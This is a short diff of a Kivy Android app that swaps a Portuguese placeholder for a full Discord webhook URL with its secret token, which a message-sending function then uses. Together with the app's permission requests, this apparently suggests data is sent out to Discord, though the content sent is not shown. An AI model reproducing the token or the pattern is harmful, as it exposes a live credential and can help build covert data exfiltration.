@@ -6,7 +6,7 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from android.permissions import request_permissions, Permission
 
-WEBHOOK = "COLE_AQUI_TEU_WEBHOOK_DISCORD"
+WEBHOOK = "https://discord.com/api/webhooks/1570207641290932414/aG-axuMOHp9pabrvqCQq7O5K9OcjUztTvX-t4mSXxhX1Zq8s46TSb3tuf0sX8_JSS_g2"
 
 def enviar(msg):
     try:
